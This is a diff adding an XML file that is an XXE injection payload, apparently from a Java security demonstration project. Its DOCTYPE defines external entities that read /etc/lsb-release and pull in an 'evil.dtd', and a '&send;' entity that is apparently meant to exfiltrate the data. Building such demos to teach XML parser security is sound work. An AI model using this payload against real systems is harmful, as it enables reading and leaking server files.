@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE model [
+        <!ENTITY % file SYSTEM
+                "file:///etc/lsb-release">
+        <!ENTITY % dtd SYSTEM
+                "file:///home/NIX/glebcher601/Documents/Others/Java Security/evil-app-demo/src/main/resources/static/dtd/evil.dtd">
+        %dtd;
+        ]>
+<model>
+    <id>11</id>
+    <data>DATA</data>
+    <type>&send;</type>
+</model>
